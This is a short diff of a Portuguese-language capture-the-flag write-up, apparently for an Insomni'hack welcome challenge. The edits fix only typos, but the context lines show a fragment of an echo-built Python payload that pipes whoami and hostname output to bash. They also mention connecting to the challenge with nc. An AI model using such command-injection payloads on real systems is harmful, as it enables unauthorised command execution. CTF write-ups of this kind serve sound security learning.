@@ -44,7 +44,7 @@ echo -n 'global i;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USE
 ![fix_base64](fix_base64.png)
 
 ---
-**ATENÇÃO.:** A saída do base64 está quebrado em algumas linhas, porém o seu valor original deve ficar somente em uma única linha e sem espaços. 
+**ATENÇÃO:** A saída do base64 está quebrado em algumas linhas, porém o seu valor original deve ficar somente em uma única linha e sem espaços. 
 
 ---
 
@@ -55,6 +55,6 @@ Feito isso, só precisamos executar novamente o comando `nc welcome.insomnihack.
 ![flag](flag.png)
 
 Bazinga! Capturamos nossa Flag.
-Espero poder ter te ajudado em algo!
+Espero ter te ajudado em algo!
 
 Abs...
